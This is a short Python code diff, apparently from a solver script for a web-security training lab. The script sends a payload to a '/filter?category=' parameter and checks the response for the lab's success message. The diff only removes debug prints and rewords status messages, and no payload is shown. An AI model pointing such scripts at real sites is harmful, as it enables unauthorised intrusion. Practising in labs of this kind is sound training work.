@@ -9,16 +9,14 @@ def req(url, payload):
     vuln_path = url+"/filter?category="+payload
     r = requests.get(url=vuln_path)
     time.sleep(5)
-    print(r.text)
-    print(vuln_path)
     if 'Congratulations, you solved the lab!' in r.text:
-        print("Solved!")
+        print("Exploited Succesfull!")
     else :
         print("failed try again...")
 
 def check(url, payload):
     if 'https://' in url:
-        print("Exploit...")
+        print("Exploiting...")
         req(url,payload)
     else :
         print("Invalid Url")
